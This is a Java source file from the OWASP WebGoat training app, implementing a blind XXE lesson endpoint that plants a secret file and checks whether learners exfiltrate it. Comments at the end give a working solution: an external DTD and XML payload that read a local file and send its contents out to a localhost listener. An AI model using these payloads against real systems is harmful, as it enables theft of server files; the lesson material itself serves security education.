package org.owasp.webgoat.plugin;

import com.google.common.base.Charsets;
import com.google.common.io.Files;
import lombok.SneakyThrows;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentHints;
import org.owasp.webgoat.assignments.AssignmentPath;
import org.owasp.webgoat.assignments.AttackResult;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.PostConstruct;
import java.io.File;

import static org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;

/**
 * ************************************************************************************************
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * <p>
 * Copyright (c) 2002 - 20014 Bruce Mayhew
 * <p>
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * <p>
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * <p>
 * Getting Source ==============
 * <p>
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
 * projects.
 * <p>
 *
 * @author nbaars
 * @version $Id: $Id
 * @since November 18, 2016
 */
@AssignmentPath("xxe/blind")
@AssignmentHints({"xxe.blind.hints.1","xxe.blind.hints.2","xxe.blind.hints.3","xxe.blind.hints.4","xxe.blind.hints.5"})
public class BlindSendFileAssignment extends AssignmentEndpoint {

    static final String CONTENTS = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";
    @Value("${webgoat.user.directory}")
    private String webGoatHomeDirectory;
    @Autowired
    private Comments comments;

    @PostConstruct
    @SneakyThrows
    public void createSecretFileWithRandomContents() {
        File targetDirectory = new File(webGoatHomeDirectory, "/XXE");
        if (!targetDirectory.exists()) {
            targetDirectory.mkdir();
        }
        Files.write(CONTENTS, new File(targetDirectory, "secret.txt"), Charsets.UTF_8);
    }

    @RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult addComment(@RequestBody String commentStr) throws Exception {
        //Solution is posted as a separate comment
        if (commentStr.contains(CONTENTS)) {
            return trackProgress(success().build());
        }

        try {
            Comment comment = comments.parseXml(commentStr);
            comments.addComment(comment, false);
        } catch (Exception e) {
            return trackProgress(failed().output(e.toString()).build());
        }
        return trackProgress(failed().build());
    }

/**
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY % remote SYSTEM "http://localhost:9090/files/admin2/attack.dtd">
%remote;
]>
<comment>  <text>test&send;</text></comment>
**/
    /**
     * Solution:
     *
     * Create DTD:
     *
     * <pre>
     *     <?xml version="1.0" encoding="UTF-8"?>
     *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/ping?text=%file;'>">
     *      %all;
     * </pre>
     *
     * This will be reduced to:
     *
     * <pre>
     *     <!ENTITY send SYSTEM 'http://localhost:9090/ping?text=[contents_file]'>
     * </pre>
     *
     * Wire it all up in the xml send to the server:
     *
     * <pre>
     *  <?xml version="1.0"?>
     *  <!DOCTYPE root [
     *  <!ENTITY % remote SYSTEM "http://localhost:9090/WebWolf/files/test.dtd">
     *  %remote;
     *   ]>
     *  <user>
     *    <username>test&send;</username>
     *  </user>
     *
     * </pre>
     *
     */
}
